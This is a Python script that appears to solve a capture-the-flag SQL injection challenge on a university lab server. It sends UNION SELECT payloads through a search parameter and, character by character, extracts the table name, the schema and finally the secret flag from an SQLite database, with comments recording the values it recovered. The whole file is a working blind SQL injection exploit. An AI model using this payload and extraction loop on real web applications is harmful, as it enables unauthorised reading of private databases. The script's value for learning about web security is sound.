import requests
import re

from bs4 import BeautifulSoup # pip install beautifulsoup4

alphabet = "abcdefghijklmnopqrstuvwxyz_"
url = "http://mustard.stt.rnl.tecnico.ulisboa.pt:23262/"

def find_table_name(table, url, limit=50):
    session = requests.Session()

    check = True

    while (limit != 0):

        limit -= 1

        for c in alphabet:
            
            if (check and (c == 'b' or c == 'u')):
                check = False
                continue

            injection = f"?search=' UNION SELECT name, tbl_name, sql FROM sqlite_master WHERE type='table' AND name LIKE '{table}{c}%' --"

            response = session.get(url + injection)
            soup = BeautifulSoup(response.text, 'html.parser')
            articles = soup.find('i').text
            found_articles = re.findall(r'\d+', articles)

            if found_articles and int(found_articles[0]) == 5:
                table += c
                break

        else:
            break

    print("Table: " + table)
    return table

table_name = find_table_name("", url)
# Table: super_s_sof_secrets

def find_table_column(column, url, limit=200):
    session = requests.Session()

    while (limit != 0):

        limit -= 1

        for c in alphabet:

            injection = f"?search=' UNION SELECT name, tbl_name, sql FROM sqlite_master WHERE type='table' AND name LIKE '{table_name}' AND sql LIKE '{column}{c}%' --"

            response = session.get(url + injection)
            soup = BeautifulSoup(response.text, 'html.parser')
            articles = soup.find('i').text
            found_articles = re.findall(r'\d+', articles)

            if found_articles and int(found_articles[0]) == 5:
                column += c
                break

        else:
            break

    print("Column: " + column)
    return column

column = find_table_column("", url)
# Column: create_table_super_s_sof_secrets____id_integer_not_null____secret_text____primary_key__id___
# Column name: secret

def find_table_flag(flag, url, limit=200):
    session = requests.Session()

    while (limit != 0):

        limit -= 1

        for c in alphabet:

            injection = f"?search=' UNION SELECT secret, secret, secret FROM {table_name} WHERE secret LIKE '{flag}{c}%' --"

            response = session.get(url + injection)
            soup = BeautifulSoup(response.text, 'html.parser')
            articles = soup.find('i').text
            found_articles = re.findall(r'\d+', articles)

            if found_articles and int(found_articles[0]) == 5:
                flag += c
                break
        
        else:
            break

    print("Flag: " + flag)
    return flag

find_table_flag("", url)